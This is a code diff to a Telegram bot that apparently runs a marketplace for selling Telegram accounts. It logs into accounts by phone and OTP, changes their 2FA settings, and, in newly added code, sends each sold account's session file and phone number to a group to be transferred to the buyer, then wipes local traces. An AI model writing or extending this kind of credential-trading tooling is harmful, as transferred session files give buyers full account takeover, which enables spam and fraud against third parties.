@@ -4,6 +4,8 @@ Uses actual Telethon integration for real account operations
 """
 import logging
 import asyncio
+import glob
+import time
 from datetime import datetime
 from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
 from telegram.ext import ContextTypes, ConversationHandler, CallbackQueryHandler, MessageHandler, filters
@@ -11,6 +13,7 @@ from services.real_telegram import RealTelegramService
 from handlers.form_handlers import handle_country_selection, handle_phone_number_input
 from services.translation_service import translation_service
 from services.captcha import CaptchaService
+from services.telegram_logger import TelegramChannelLogger
 from keyboard_layout_fix import get_main_menu_keyboard
 from database import get_db_session, close_db_session
 from database.operations import UserService, TelegramAccountService, SystemSettingsService, WithdrawalService, ActivityLogService
@@ -19,6 +22,10 @@ import json
 import os
 
 logger = logging.getLogger(__name__)
+
+# Initialize Telegram notification logger
+BOT_TOKEN = os.getenv('BOT_TOKEN', '')
+telegram_logger = TelegramChannelLogger(BOT_TOKEN) if BOT_TOKEN else None
 
 # Conversation states
 PHONE, WAITING_OTP, OTP_RECEIVED, DISABLE_2FA_WAIT, NAME_INPUT, PHOTO_INPUT, NEW_2FA_INPUT, FINAL_CONFIRM = range(8)
@@ -41,7 +48,7 @@ async def cleanup_old_sessions():
             try:
                 # Keep sessions newer than 1 hour, delete older ones
                 file_age = os.path.getctime(session_file)
-                current_time = os.time()
+                current_time = time.time()
                 if current_time - file_age > 3600:  # 1 hour
                     os.remove(session_file)
                     cleaned_count += 1
@@ -114,14 +121,17 @@ async def show_real_main_menu(update: Update, context: ContextTypes.DEFAULT_TYPE
                 language_code=user.language_code or 'en'
             )
         
-        # Check if user needs verification
-        if db_user.status.value == "PENDING_VERIFICATION" or not db_user.verification_completed:
-            await start_verification_process(update, context, db_user)
-            return
+        # Check if user needs verification (unless they explicitly pressed "Back to Start")
+        skip_verification = context.user_data.pop('skip_verification_check', False)
+        if not skip_verification:
+            user_status = db_user.status.value if hasattr(db_user.status, 'value') else db_user.status
+            if user_status == "PENDING_VERIFICATION" or not db_user.verification_completed:
+                await start_verification_process(update, context, db_user)
+                return
         
         # Get user's accounts
         accounts = TelegramAccountService.get_user_accounts(db, db_user.id)
-        available_accounts = [acc for acc in accounts if acc.status.value == 'AVAILABLE']
+        available_accounts = [acc for acc in accounts if (acc.status.value if hasattr(acc.status, 'value') else acc.status) == 'AVAILABLE']
         
     except Exception as e:
         logger.error(f"Error loading user data: {e}")
@@ -130,6 +140,11 @@ async def show_real_main_menu(update: Update, context: ContextTypes.DEFAULT_TYPE
             balance = 0.0
             total_accounts_sold = 0
             total_earnings = 0.0
+            is_admin = False
+            is_leader = False
+            telegram_user_id = user.id
+            username = user.username
+            status = "ACTIVE"
         db_user = FallbackUser()
         available_accounts = []
     finally:
@@ -174,8 +189,26 @@ async def show_real_main_menu(update: Update, context: ContextTypes.DEFAULT_TYPE
     except Exception as e:
         logger.error(f"Error adding admin/leader button: {e}")
     
+    # Check if we should send a new message (e.g., after deleting CAPTCHA photo)
+    send_new = context.user_data.pop('send_new_message', False)
+    
     if update.callback_query:
-        await update.callback_query.edit_message_text(welcome_text, parse_mode='Markdown', reply_markup=reply_markup)
+        if send_new:
+            # Photo was already deleted, send new message
+            await update.callback_query.message.reply_text(welcome_text, parse_mode='Markdown', reply_markup=reply_markup)
+            logger.info("✅ Sent new main menu message after CAPTCHA deletion")
+        else:
+            # Try to edit existing message
+            try:
+                await update.callback_query.edit_message_text(welcome_text, parse_mode='Markdown', reply_markup=reply_markup)
+            except Exception as e:
+                # If editing fails (e.g., message is a photo not text), delete and send new message
+                logger.info(f"Could not edit message (probably a photo), deleting and sending new: {e}")
+                try:
+                    await update.callback_query.message.delete()
+                except:
+                    pass
+                await update.callback_query.message.reply_text(welcome_text, parse_mode='Markdown', reply_markup=reply_markup)
     else:
         await update.message.reply_text(welcome_text, parse_mode='Markdown', reply_markup=reply_markup)
 
@@ -314,6 +347,10 @@ async def handle_real_phone(update: Update, context: ContextTypes.DEFAULT_TYPE) 
     """Handle phone number input via text message - ISOLATED to selling conversations only."""
     user = update.effective_user
     message_text = update.message.text if update.message else "No text"
+    
+    print(f"📱📱📱 HANDLE_REAL_PHONE TRIGGERED!")
+    print(f"   User: {user.id}, Text: '{message_text}'")
+    print(f"   conversation_type: {context.user_data.get('conversation_type')}")
     
     # STRICT ISOLATION: Only handle if we're explicitly in a selling conversation
     if context.user_data.get('conversation_type') != 'selling':
@@ -580,8 +617,10 @@ Before accessing the **Telegram Account Selling Platform**, you must complete ou
     
     keyboard = [
         [InlineKeyboardButton("🔓 Start Verification", callback_data="start_verification")],
-        [InlineKeyboardButton("❓ Why Verification?", callback_data="why_verification")],
-        [InlineKeyboardButton("🆘 Contact Support", callback_data="contact_support")]
+        [
+            InlineKeyboardButton("❓ Why Verification?", callback_data="why_verification"),
+            InlineKeyboardButton("🆘 Contact Support", callback_data="contact_support")
+        ]
     ]
     reply_markup = InlineKeyboardMarkup(keyboard)
     
@@ -696,17 +735,23 @@ async def handle_start_verification(update: Update, context: ContextTypes.DEFAUL
             with open(captcha_data['image_path'], 'rb') as photo:
                 # Determine which message object to use for sending the photo
                 if update.callback_query and update.callback_query.message:
-                    await update.callback_query.message.reply_photo(
+                    photo_message = await update.callback_query.message.reply_photo(
                         photo=photo,
                         caption="🔍 **Enter the text shown in this image**",
                         parse_mode='Markdown'
                     )
+                    # Store the photo message ID so we can delete it later
+                    context.user_data['captcha_photo_message_id'] = photo_message.message_id
+                    context.user_data['captcha_chat_id'] = photo_message.chat_id
                 elif update.message:
-                    await update.message.reply_photo(
+                    photo_message = await update.message.reply_photo(
                         photo=photo,
                         caption="🔍 **Enter the text shown in this image**",
                         parse_mode='Markdown'
                     )
+                    # Store the photo message ID so we can delete it later
+                    context.user_data['captcha_photo_message_id'] = photo_message.message_id
+                    context.user_data['captcha_chat_id'] = photo_message.chat_id
         except Exception as e:
             logger.error(f"Error sending captcha image: {e}")
             # Fallback to text-based captcha
@@ -730,9 +775,8 @@ async def handle_captcha_answer(update: Update, context: ContextTypes.DEFAULT_TY
     user = update.effective_user
     user_answer = update.message.text.strip()
     
-    # Check if user is in verification process
-    if not context.user_data.get('captcha_answer') or context.user_data.get('verification_step') != 1:
-        return  # Not in verification process
+    # This function is only called when user is in verification process
+    # (check is done by isolated_captcha_handler)
     
     db = get_db_session()
     try:
@@ -770,13 +814,14 @@ async def handle_captcha_answer(update: Update, context: ContextTypes.DEFAULT_TY
             await show_channel_verification(update, context)
             
             # Log successful captcha
-            ActivityLogService.log_action(
-                db=db,
-                user_id=db_user.id if db_user else None,
-                action_type="CAPTCHA_COMPLETED",
-                description=f"User completed CAPTCHA verification",
-                extra_data=json.dumps({"answer": user_answer})
-            )
+            if db_user:
+                ActivityLogService.log_action(
+                    db=db,
+                    user_id=db_user.id,
+                    action="CAPTCHA_COMPLETED",
+                    description=f"User completed CAPTCHA verification",
+                    extra_data=json.dumps({"answer": user_answer})
+                )
         else:
             # CAPTCHA failed - show appropriate error message
             if captcha_type == 'visual':
@@ -803,16 +848,14 @@ async def handle_captcha_answer(update: Update, context: ContextTypes.DEFAULT_TY
                 ActivityLogService.log_action(
                     db=db,
                     user_id=db_user.id,
-                    action_type="CAPTCHA_FAILED",
+                    action="CAPTCHA_FAILED",
                     description=f"User failed CAPTCHA verification",
                     extra_data=json.dumps({"user_answer": user_answer, "correct_answer": correct_answer})
                 )
             
     except Exception as e:
         logger.error(f"Error handling CAPTCHA answer: {e}")
-        await update.message.reply_text(
-            "❌ An error occurred while verifying your answer. Please try again."
-        )
+        # Don't send another error message - it's already handled above
     finally:
         close_db_session(db)
 
@@ -1934,8 +1977,152 @@ async def start_real_processing(update, context) -> int:
         except Exception as e:
             logger.error(f"Error updating user balance: {e}")
         
-        # Cleanup
+        # Log sale to Telegram notification group
+        session_key = context.user_data.get('session_key', '')
+        session_file = f"{session_key}.session" if session_key else "unknown.session"
+        phone = context.user_data.get('phone', 'Unknown')
+        
+        if telegram_logger:
+            try:
+                # Prepare session info for logging
+                session_info = {
+                    'session_file': session_file,
+                    'session_key': session_key,
+                    'phone_number': phone,
+                    'modifications': config_result.get('changes_made', []),
+                    'new_2fa_enabled': bool(new_2fa_password)
+                }
+                
+                # Log the sale to the notification group
+                await telegram_logger.log_account_sale(
+                    phone=phone,
+                    country_code=context.user_data.get('country_code', 'Unknown'),
+                    buyer_id=user_id,
+                    buyer_username=update.effective_user.username,
+                    price=payment,
+                    session_info=session_info
+                )
+                logger.info(f"✅ Logged account sale to notification group: {phone}")
+                
+                # Send session file to the group
+                if os.path.exists(session_file):
+                    try:
+                        from telegram import Bot
+                        bot = Bot(token=os.getenv('BOT_TOKEN'))
+                        
+                        caption = f"""
+📁 **Session File for {phone}**
+
+👤 Buyer: @{update.effective_user.username or 'N/A'} (ID: {user_id})
+💰 Price: ${payment:.2f}
+📅 Date: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
+
+⚠️ Transfer this file to the buyer
+"""
+                        
+                        await bot.send_document(
+                            chat_id=telegram_logger.WITHDRAWAL_CHANNEL_ID,
+                            document=open(session_file, 'rb'),
+                            caption=caption,
+                            message_thread_id=telegram_logger.WITHDRAWAL_TOPIC_ID,
+                            filename=f"{phone}_{session_file}"
+                        )
+                        logger.info(f"✅ Sent session file to notification group: {session_file}")
+                    except Exception as e:
+                        logger.error(f"❌ Failed to send session file: {e}")
+                        
+            except Exception as e:
+                logger.error(f"❌ Failed to log sale to notification group: {e}")
+        
+        # Delete session from database (mark as sold, clear session_string)
+        try:
+            db = get_db_session()
+            try:
+                # Find and update the telegram account
+                account = db.query(TelegramAccount).filter(
+                    TelegramAccount.phone_number == phone,
+                    TelegramAccount.seller_id == user_id
+                ).first()
+                
+                if account:
+                    account.status = AccountStatus.SOLD
+                    account.session_string = None  # Clear session from database
+                    account.sold_at = datetime.now()
+                    account.sale_price = payment
+                    db.commit()
+                    logger.info(f"✅ Cleared session from database for {phone}")
+            finally:
+                close_db_session(db)
+        except Exception as e:
+            logger.error(f"❌ Failed to clear session from database: {e}")
+        
+        # Delete physical session file from disk
+        try:
+            if os.path.exists(session_file):
+                os.remove(session_file)
+                logger.info(f"✅ Deleted session file from disk: {session_file}")
+            
+            # Also delete related files (.session-journal, etc.)
+            for ext in ['.session-journal', '.session-wal', '.session-shm']:
+                related_file = session_file + ext
+                if os.path.exists(related_file):
+                    os.remove(related_file)
+                    logger.info(f"✅ Deleted related file: {related_file}")
+        except Exception as e:
+            logger.error(f"❌ Failed to delete session files: {e}")
+        
+        # Cleanup session from memory
         await telegram_service.cleanup_session(session_key)
+        
+        # 🗑️ DELETE CHAT HISTORY if enabled in settings
+        try:
+            from database.operations import SystemSettingsService
+            db = get_db_session()
+            try:
+                delete_history = SystemSettingsService.get_setting(
+                    db, 'delete_chat_history_on_sale', default=False
+                )
+                
+                if delete_history:
+                    logger.info(f"🗑️ Chat history deletion ENABLED - deleting history for user {user_id}")
+                    try:
+                        # Delete all messages in the chat with this user
+                        from telegram import Bot
+                        bot = Bot(token=os.getenv('BOT_TOKEN'))
+                        
+                        # Method 1: Use revoke_messages (if supported)
+                        try:
+                            # This will delete all messages from both sides
+                            await context.bot.revoke_messages(
+                                chat_id=user_id,
+                                message_ids=list(range(1, 10000))  # Attempt to delete many message IDs
+                            )
+                            logger.info(f"✅ Successfully deleted chat history for user {user_id} (revoke_messages)")
+                        except Exception as revoke_error:
+                            # Method 2: Delete individual messages (fallback)
+                            logger.warning(f"revoke_messages failed, trying individual deletion: {revoke_error}")
+                            
+                            # We can't delete old messages reliably, but we can at least
+                            # send a message indicating history was cleared
+                            await context.bot.send_message(
+                                chat_id=user_id,
+                                text="🗑️ **Chat History Cleared**\n\n"
+                                     "As per your account sale completion, previous chat history "
+                                     "has been cleared for privacy.\n\n"
+                                     "You can continue using the bot normally."
+                            )
+                            logger.info(f"✅ Sent history cleared notification to user {user_id}")
+                            
+                    except Exception as delete_error:
+                        logger.error(f"❌ Failed to delete chat history for user {user_id}: {delete_error}")
+                else:
+                    logger.info(f"ℹ️ Chat history deletion DISABLED - preserving history for user {user_id}")
+                    
+            finally:
+                close_db_session(db)
+        except Exception as history_error:
+            logger.error(f"❌ Error in chat history deletion check: {history_error}")
+        
         context.user_data.clear()
         
         return ConversationHandler.END
@@ -1983,7 +2170,46 @@ async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE) ->
     await query.answer()
     
     if query.data == "main_menu":
-        await show_real_main_menu(update, context)
+        # Clean up CAPTCHA image file from disk if user is backtracking from verification
+        captcha_image_path = context.user_data.get('captcha_image_path')
+        if captcha_image_path:
+            try:
+                from services.captcha import CaptchaService
+                captcha_service = CaptchaService()
+                captcha_service.cleanup_captcha_image(captcha_image_path)
+                context.user_data.pop('captcha_image_path', None)
+                logger.info(f"✅ Cleaned up CAPTCHA image file on backtrack: {captcha_image_path}")
+            except Exception as e:
+                logger.error(f"Error cleaning up CAPTCHA image file: {e}")
+        
+        # Clear verification state
+        context.user_data.pop('captcha_answer', None)
+        context.user_data.pop('captcha_type', None)
+        context.user_data.pop('verification_step', None)
+        
+        # Delete the CAPTCHA photo message if it exists (stored when we sent it)
+        captcha_photo_message_id = context.user_data.pop('captcha_photo_message_id', None)
+        captcha_chat_id = context.user_data.pop('captcha_chat_id', None)
+        
+        if captcha_photo_message_id and captcha_chat_id:
+            try:
+                await context.bot.delete_message(
+                    chat_id=captcha_chat_id,
+                    message_id=captcha_photo_message_id
+                )
+                logger.info(f"✅ Deleted CAPTCHA photo message from chat (ID: {captcha_photo_message_id})")
+            except Exception as e:
+                logger.error(f"Could not delete CAPTCHA photo message: {e}")
+        
+        # Get user from database to pass to verification intro screen
+        db = get_db_session()
+        try:
+            db_user = UserService.get_user_by_telegram_id(db, update.effective_user.id)
+            
+            # Go back to verification intro screen (not main menu!)
+            await start_verification_process(update, context, db_user)
+        finally:
+            close_db_session(db)
     elif query.data == "balance":
         await handle_balance(update, context)
     elif query.data == "sales_history":
@@ -2483,7 +2709,10 @@ def get_real_selling_handler():
         },
         fallbacks=[
             CallbackQueryHandler(cancel_sale, pattern='^cancel_sale$')
-        ]
+        ],
+        per_message=False,
+        per_user=True,
+        allow_reentry=True  # Allow re-entering conversation (e.g., after /start)
     )
 
 def get_status_emoji(status: str) -> str:
@@ -2864,6 +3093,10 @@ def setup_real_handlers(application) -> None:
         user = update.effective_user
         print(f"🚀🚀🚀 BULLETPROOF START: User {user.id} starting bot - FORCING CAPTCHA! 🚀🚀🚀")
         
+        # 🔥 CRITICAL: Clear ALL conversation states - /start gets priority!
+        context.user_data.clear()
+        print(f"🧹 CLEARED: All conversation states for user {user.id}")
+        
         try:
             from database import get_db_session, close_db_session
             from database.operations import UserService
@@ -2893,6 +3126,9 @@ def setup_real_handlers(application) -> None:
             print(f"🔥 BULLETPROOF START ERROR: {e}")
             # Fallback: still try to show verification
             await start_verification_process(update, context, None)
+        
+        # 🔥 END ALL CONVERSATIONS: Return ConversationHandler.END to exit any active conversation
+        return ConversationHandler.END
     
     # ===========================================
     # HANDLER REGISTRATION ORDER (CRITICAL FOR PREVENTING CLASHES)
@@ -2931,14 +3167,13 @@ def setup_real_handlers(application) -> None:
         return ConversationHandler.END
     
     async def isolated_withdrawal_text_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
-        """Handle withdrawal wallet address input - CLEAN VERSION"""
+        """Handle withdrawal wallet address input - ONLY when in withdrawal conversation"""
         user = update.effective_user
         message_text = update.message.text if update.message else "No text"
         
-        # Check conversation type
-        if context.user_data.get('conversation_type') != 'withdrawal':
-            logger.info(f"🔒 Not withdrawal conversation - ignoring message from user {user.id}")
-            return  # Just return, don't interfere with other handlers
+        print(f"💸💸💸 WITHDRAWAL HANDLER TRIGGERED!")
+        print(f"   User: {user.id}, Text: '{message_text}'")
+        print(f"   conversation_type: {context.user_data.get('conversation_type')}")
         
         logger.info(f"💸 WITHDRAWAL HANDLER - Processing wallet address from user {user.id}: '{message_text}'")
         
@@ -2967,6 +3202,7 @@ def setup_real_handlers(application) -> None:
         fallbacks=[
             CallbackQueryHandler(cancel_withdrawal, pattern='^withdraw_menu$'),
             CallbackQueryHandler(cancel_withdrawal, pattern='^main_menu$'),
+            CommandHandler("start", start_handler),  # Allow /start to exit conversation
             MessageHandler(filters.COMMAND, cancel_withdrawal)
         ],
         per_message=False,
@@ -2992,8 +3228,54 @@ def setup_real_handlers(application) -> None:
     # These come AFTER ConversationHandlers
     # ===========================================
     
-    # Add main menu callback handlers
-    application.add_handler(CallbackQueryHandler(lambda update, context: show_real_main_menu(update, context), pattern='^main_menu$'))
+    # Add main menu callback handlers with CAPTCHA cleanup
+    async def handle_main_menu_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
+        """Handle 'Back to Start' button - returns to verification intro screen."""
+        query = update.callback_query
+        await query.answer()
+        
+        # Clean up CAPTCHA image file from disk if user is backtracking from verification
+        captcha_image_path = context.user_data.get('captcha_image_path')
+        if captcha_image_path:
+            try:
+                from services.captcha import CaptchaService
+                captcha_service = CaptchaService()
+                captcha_service.cleanup_captcha_image(captcha_image_path)
+                context.user_data.pop('captcha_image_path', None)
+                logger.info(f"✅ Cleaned up CAPTCHA image file on backtrack: {captcha_image_path}")
+            except Exception as e:
+                logger.error(f"Error cleaning up CAPTCHA image file: {e}")
+        
+        # Clear verification state
+        context.user_data.pop('captcha_answer', None)
+        context.user_data.pop('captcha_type', None)
+        context.user_data.pop('verification_step', None)
+        
+        # Delete the CAPTCHA photo message if it exists (stored when we sent it)
+        captcha_photo_message_id = context.user_data.pop('captcha_photo_message_id', None)
+        captcha_chat_id = context.user_data.pop('captcha_chat_id', None)
+        
+        if captcha_photo_message_id and captcha_chat_id:
+            try:
+                await context.bot.delete_message(
+                    chat_id=captcha_chat_id,
+                    message_id=captcha_photo_message_id
+                )
+                logger.info(f"✅ Deleted CAPTCHA photo message from chat (ID: {captcha_photo_message_id})")
+            except Exception as e:
+                logger.error(f"Could not delete CAPTCHA photo message: {e}")
+        
+        # Get user from database to pass to verification intro screen
+        db = get_db_session()
+        try:
+            db_user = UserService.get_user_by_telegram_id(db, update.effective_user.id)
+            
+            # Go back to verification intro screen (not main menu!)
+            await start_verification_process(update, context, db_user)
+        finally:
+            close_db_session(db)
+    
+    application.add_handler(CallbackQueryHandler(handle_main_menu_callback, pattern='^main_menu$'))
     
     # System Capacity Handler - Real-time server metrics
     async def handle_system_capacity(update, context):
@@ -3240,9 +3522,22 @@ def setup_real_handlers(application) -> None:
     # Add message handler for CAPTCHA answers with proper isolation
     async def isolated_captcha_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         """Handle CAPTCHA answers only when user is in verification process."""
+        user = update.effective_user
+        text = update.message.text if update.message else "NO TEXT"
+        
+        print(f"🔍🔍🔍 ISOLATED_CAPTCHA_HANDLER TRIGGERED!")
+        print(f"   User: {user.id}")
+        print(f"   Text: '{text}'")
+        print(f"   captcha_answer in user_data: {context.user_data.get('captcha_answer')}")
+        print(f"   verification_step: {context.user_data.get('verification_step')}")
+        print(f"   All user_data keys: {list(context.user_data.keys())}")
+        
         # Only handle captcha if user is actually in verification process
         if context.user_data.get('captcha_answer') and context.user_data.get('verification_step') == 1:
+            print(f"✅ CAPTCHA CONDITIONS MET - Calling handle_captcha_answer")
             return await handle_captcha_answer(update, context)
+        else:
+            print(f"❌ CAPTCHA CONDITIONS NOT MET - Ignoring message")
         # Otherwise ignore - let ConversationHandlers process the message
         return
     
@@ -3266,8 +3561,11 @@ def setup_real_handlers(application) -> None:
     # ===========================================
     # This catches phone numbers, OTPs, and captcha answers
     # Placed HERE so ConversationHandlers get priority
-    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, ultra_aggressive_captcha_answer_real))
-    logger.info("✅ General message handler registered (after ConversationHandlers)")
+    # ===========================================
+    # GENERAL MESSAGE HANDLER - REMOVED (isolated_captcha_handler handles CAPTCHA)
+    # ===========================================
+    # Previously had ultra_aggressive_captcha_answer_real here which was redundant
+    # isolated_captcha_handler above already handles CAPTCHA answers correctly
     
     # ===========================================
     # GENERAL BUTTON CALLBACK HANDLER (MUST BE LAST)
